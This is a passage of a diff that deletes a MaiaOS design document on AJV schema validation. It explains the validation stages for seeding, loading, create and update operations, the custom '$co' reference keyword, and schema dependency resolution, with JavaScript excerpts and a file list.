-  "$id": "@actor/vibe",
-  "view": "@view/list",
-  "children": {
-    "item": "@actor/list-item"
-  }
-}
-
-// After transformation
-{
-  "$schema": "co_z456...",  // Actor schema co-id
-  "$id": "co_z789...",      // Vibe actor co-id
-  "view": "co_z101...",     // List view co-id
-  "children": {
-    "item": "co_z202..."    // List-item actor co-id
-  }
-}
-```
-
-### 4.5. Instance Validation After Transformation
-
-**When:** After instance transformation, before storage  
-**Where:** `libs/maia-script/src/o/engines/db-engine/backend/indexeddb.js:378-420`  
-**What:** Transformed instances validated against their `$schema` schema
-
-```javascript
-// Phase 4.5: Validate transformed instances against their $schema schemas
-const { validateAgainstSchemaOrThrow } = await import('@MaiaOS/schemata/validation.helper.js');
-const { setSchemaResolver } = await import('@MaiaOS/schemata/validation.helper.js');
-
-// Set up schema resolver for loading schemas from DB (schemas were just seeded in Phase 3)
-setSchemaResolver(async (schemaKey) => {
-  return await this.getSchema(schemaKey);
-});
-
-// Validate each transformed instance
-for (const [configType, configValue] of Object.entries(transformedConfigs)) {
-  if (Array.isArray(configValue)) {
-    for (const [index, instance] of configValue.entries()) {
-      if (instance && instance.$schema) {
-        const schema = await this.getSchema(instance.$schema);
-        if (schema) {
-          await validateAgainstSchemaOrThrow(
-            schema,
-            instance,
-            `${configType}[${index}] (${instance.$id || 'no-id'})`
-          );
-        }
-      }
-    }
-  } else if (configValue && typeof configValue === 'object' && configValue.$schema) {
-    const schema = await this.getSchema(configValue.$schema);
-    if (schema) {
-      await validateAgainstSchemaOrThrow(
-        schema,
-        configValue,
-        `${configType} (${configValue.$id || 'no-id'})`
-      );
-    }
-  } else if (configValue && typeof configValue === 'object') {
-    // Nested objects (e.g., actors: { 'vibe/vibe': {...} })
-    for (const [instanceKey, instance] of Object.entries(configValue)) {
-      if (instance && instance.$schema) {
-        const schema = await this.getSchema(instance.$schema);
-        if (schema) {
-          await validateAgainstSchemaOrThrow(
-            schema,
-            instance,
-            `${configType}.${instanceKey} (${instance.$id || 'no-id'})`
-          );
-        }
-      }
-    }
-  }
-}
-```
-
-**What Gets Validated:**
-- Required fields (`$schema`, `$id`)
-- Field types and formats
-- Reference properties (must be valid co-ids)
-- Nested object structures
-- Enum values
-- Transformation didn't introduce errors
-
-**Why This Matters:**
-- Catches transformation errors before storage
-- Ensures data integrity from the start
-- Prevents invalid instances from being stored
-- Errors caught during seeding, not at runtime
-
-### 4. Config/Instance Validation On Load
-
-**When:** When configs/instances are loaded from IndexedDB  
-**Where:** Engine load methods (ActorEngine, StateEngine, ViewEngine)  
-**What:** Instance validated against its schema
-
-**ActorEngine.loadActor():**
-```javascript
-// libs/maia-script/src/o/engines/actor-engine/actor.engine.js:73-110
-async loadActor(coIdOrConfig) {
-  // If pre-loaded config object, validate it
-  if (typeof coIdOrConfig === 'object' && coIdOrConfig !== null) {
-    const schema = await loadSchemaFromDB(this.dbEngine, 'actor');
-    if (schema) {
-      await validateAgainstSchemaOrThrow(schema, coIdOrConfig, 'actor');
-    }
-    return coIdOrConfig;
-  }
-  
-  // Load from IndexedDB
-  const actor = await this.dbEngine.execute({
-    op: 'query',
-    schema: '@schema/actor',
-    key: coIdOrConfig
-  });
-  
-  // Validate loaded actor
-  const schema = await loadSchemaFromDB(this.dbEngine, 'actor');
-  if (schema) {
-    await validateAgainstSchemaOrThrow(schema, actor, 'actor');
-  }
-  
-  return actor;
-}
-```
-
-**StateEngine.loadStateDef():**
-```javascript
-// libs/maia-script/src/o/engines/state-engine/state.engine.js:34-61
-async loadStateDef(stateRef) {
-  const stateDef = await this.dbEngine.execute({
-    op: 'query',
-    schema: '@schema/state',
-    key: stateRef
-  });
-  
-  await validateOrThrow('state', stateDef, `maia.db:${stateRef}`);
-  this.stateCache.set(stateRef, stateDef);
-  return stateDef;
-}
-```
-
-**What Gets Validated:**
-- Required fields (`$schema`, `$id`)
-- Field types and formats
-- Reference properties (must be valid co-ids)
-- Nested object structures
-- Enum values
-
-### 5. Application Data Validation On Create/Update
-
-**When:** Before data is stored in IndexedDB  
-**Where:** CreateOperation.execute(), UpdateOperation.execute()  
-**What:** Data validated against collection schema
-
-**CreateOperation.execute():**
-```javascript
-// libs/maia-script/src/o/engines/db-engine/operations/create.js:25-47
-async execute(params) {
-  const { schema, data } = params;
-  
-  // Validate data against schema before creating
-  if (this.dbEngine) {
-    const schemaDef = await loadSchemaFromDB(this.dbEngine, schema);
-    if (schemaDef) {
-      await validateAgainstSchemaOrThrow(schemaDef, data, `create operation for schema ${schema}`);
-    }
-  }
-  
-  return await this.backend.create(schema, data);
-}
-```
-
-**UpdateOperation.execute():**
-```javascript
-// libs/maia-script/src/o/engines/db-engine/operations/update.js:26-52
-async execute(params) {
-  const { schema, id, data } = params;
-  
-  // Validate data against schema before updating
-  if (this.dbEngine) {
-    const schemaDef = await loadSchemaFromDB(this.dbEngine, schema);
-    if (schemaDef) {
-      await validateAgainstSchemaOrThrow(schemaDef, data, `update operation for schema ${schema}`);
-    }
-  }
-  
-  return await this.backend.update(schema, id, data);
-}
-```
-
-**What Gets Validated:**
-- Required fields
-- Field types (string, number, boolean, object, array)
-- String constraints (minLength, maxLength, pattern)
-- Number constraints (minimum, maximum)
-- Enum values
-- Nested object structures
-- `$co` references (must be valid co-ids matching referenced schema)
-
-## How $co Links Work
-
-### Overview
-
-The `$co` keyword is a **custom AJV keyword** that validates CoValue references. It's a macro that expands to string validation with a co-id pattern.
-
-### AJV Plugin Implementation
-
-**Location:** `libs/maia-schemata/src/ajv-co-types-plugin.js:16-39`
-
-```javascript
-ajv.addKeyword({
-  keyword: "$co",
-  macro: (schemaCoId) => ({
-    type: "string",
-    pattern: "^co_z[a-zA-Z0-9]+$",
-    _schemaRef: schemaCoId  // Store schema co-id for metadata
-  }),
-  metaSchema: {
-    type: "string",
-    anyOf: [
-      {
-        pattern: "^co_z[a-zA-Z0-9]+$",
-        description: "Co-id reference (after transformation)"
-      },
-      {
-        pattern: "^@schema/",
-        description: "Human-readable schema ID (before transformation)"
-      }
-    ],
-    description: "Reference to schema that this property value must conform to"
-  }
-})
-```
-
-### How $co Works
-
-1. **Schema Definition:**
-   ```json
-   {
-     "properties": {
-       "view": {
-         "$co": "@schema/view"  // Human-readable (before transformation)
-       }
-     }
-   }
-   ```
-
-2. **Schema Transformation:**
-   During seeding, `transformSchemaForSeeding()` replaces `@schema/view` with the actual co-id:
-   ```json
-   {
-     "properties": {
-       "view": {
-         "$co": "co_z789..."  // Co-id (after transformation)
-       }
-     }
-   }
-   ```
-
-3. **Validation:**
-   When validating an instance, AJV:
-   - Expands `$co` macro to: `{type: "string", pattern: "^co_z[a-zA-Z0-9]+$"}`
-   - Validates that the property value is a valid co-id string
-   - Stores the referenced schema co-id in `_schemaRef` (for future use)
-
-4. **Schema Resolution:**
-   The ValidationEngine's `_resolveAndRegisterSchemaDependencies()` method:
-   - Finds all `$co` references in schemas
-   - Resolves them via `schemaResolver` (loads from IndexedDB)
-   - Registers referenced schemas in AJV registry
-   - Enables `$ref` resolution during schema compilation
-
-**Location:** `libs/maia-schemata/src/validation.engine.js:596-703`
-
-### $co vs $ref
-
-| Feature | `$co` | `$ref` |
-|---------|-------|--------|
-| **Purpose** | CoValue reference (runtime entity) | Schema reference (compile-time) |
-| **Value Type** | Co-id string (`co_z...`) | Schema co-id or URI |
-| **Validation** | Validates co-id pattern | Validates against referenced schema |
-| **Usage** | Properties referencing other CoValues | Schemas referencing other schemas |
-| **Example** | `"view": {"$co": "co_z789..."}` | `"$ref": "co_z456..."` |
-
-### $co Resolution Flow
-
-```
-Schema Definition (with $co)
-  ↓
-transformSchemaForSeeding() → Replace @schema/name with co-id
-  ↓
-Store in IndexedDB (with co-id in $co)
-  ↓
-Load Schema from IndexedDB
-  ↓
-_resolveAndRegisterSchemaDependencies() → Find $co references
-  ↓
-schemaResolver($co value) → Load referenced schema from IndexedDB
-  ↓
-Register referenced schema in AJV registry
-  ↓
-Compile schema (AJV can resolve $ref to referenced schema)
-  ↓
-Validate instance (AJV validates $co as co-id string pattern)
-```
-
-## Schema Resolution & Dependency Loading
-
-### Schema Resolver
-
-**Location:** `libs/maia-script/src/o/kernel.js:125-133`
-
-```javascript
-setSchemaResolver(async (schemaKey) => {
-  try {
-    return await backend.getSchema(schemaKey);
-  } catch (error) {
-    console.warn(`[MaiaOS] Failed to resolve schema ${schemaKey}:`, error);
-    return null;
-  }
-});
-```
-
-### Dependency Resolution
-
-**Location:** `libs/maia-schemata/src/validation.engine.js:536-723`
-
-The `_resolveAndRegisterSchemaDependencies()` method:
-1. Recursively traverses schema object
-2. Finds `$schema` references (co-ids)
-3. Finds `$co` references (co-ids or human-readable IDs)
-4. Resolves each reference via `schemaResolver`
-5. Registers resolved schemas in AJV registry (by both co-id and reference)
-6. Prevents circular dependencies (tracks `resolvingSchemas` set)
-
-**Key Features:**
-- Handles reference objects (`{ $coId: "co_z...", ... }`)
-- Prevents infinite loops (tracks resolved schemas)
-- Registers schemas with multiple keys (co-id and reference)
-- Temporarily disables schema validation during registration (prevents circular dependency errors)
-
-## Validation Engine Architecture
-
-### Components
-
-1. **ValidationEngine** (`libs/maia-schemata/src/validation.engine.js`)
-   - Core AJV instance management
-   - Schema compilation and caching
-   - Meta-schema registration
-   - Dependency resolution
-
-2. **ValidationHelper** (`libs/maia-schemata/src/validation.helper.js`)
-   - Singleton validation engine
-   - Convenience functions (`validate`, `validateOrThrow`, `validateAgainstSchema`)
-   - Schema resolver management
-
-3. **AJV CoTypes Plugin** (`libs/maia-schemata/src/ajv-co-types-plugin.js`)
-   - `$co` keyword macro
-   - `cotype` keyword validator
-
-4. **Schema Loader** (`libs/maia-schemata/src/schema-loader.js`)
-   - Loads schemas from IndexedDB
-   - Handles co-ids and human-readable keys
-   - Resolves reference objects
-
-### Validation Flow Summary
-
-```
-┌─────────────────────────────────────────────────────────────┐
-│                    VALIDATION ROUNDTRIPS                     │
-└─────────────────────────────────────────────────────────────┘
-
-SEEDING:
-  1. Schemas validated against meta-schema ✅
-  2. Schemas transformed (human-readable → co-ids) ✅
-  2.5. Transformed schemas validated against their $schema meta-schema ✅
-  3. Schemas stored (validated) ✅
-  4. Instances transformed (human-readable → co-ids) ✅
-  4.5. Transformed instances validated against their $schema schema ✅
-  5. Instances stored (validated) ✅
-
-LOADING:
-  6. Configs/instances loaded from IndexedDB ✅
-  7. Configs/instances validated against schema ✅
-
-CREATING:
-  8. Application data validated against schema ✅
-  9. Data stored in IndexedDB ✅
-
-UPDATING:
-  10. Application data validated against schema ✅
-  11. Data updated in IndexedDB ✅
-```
-
-## Key Takeaways
-
-1. **Schemas are validated twice** during seeding:
-   - Before transformation (against meta-schema)
-   - After transformation (against their $schema meta-schema)
-2. **Instances are validated twice**:
-   - During seeding (after transformation, before storage)
-   - On load (when loaded from IndexedDB)
-3. **Application data is validated on create/update** (against collection schema)
-4. **$co links** are transformed during seeding and validated as co-id strings
-5. **Schema dependencies** are resolved and registered before compilation
-6. **Validation happens before storage** - ensures invalid data never gets stored
-
-## Files Reference
-
-- **Validation Engine:** `libs/maia-schemata/src/validation.engine.js`
-- **Validation Helper:** `libs/maia-schemata/src/validation.helper.js`
-- **Schema Transformer:** `libs/maia-schemata/src/schema-transformer.js`
-- **Schema Loader:** `libs/maia-schemata/src/schema-loader.js`
-- **AJV Plugin:** `libs/maia-schemata/src/ajv-co-types-plugin.js`
-- **Kernel Boot:** `libs/maia-script/src/o/kernel.js:55-134`
-- **Backend Seed:** `libs/maia-script/src/o/engines/db-engine/backend/indexeddb.js:95-381`
-- **Create Operation:** `libs/maia-script/src/o/engines/db-engine/operations/create.js`
-- **Update Operation:** `libs/maia-script/src/o/engines/db-engine/operations/update.js`
-- **Actor Engine Load:** `libs/maia-script/src/o/engines/actor-engine/actor.engine.js:73-110`
-- **State Engine Load:** `libs/maia-script/src/o/engines/state-engine/state.engine.js:34-61`
 
 ---
 
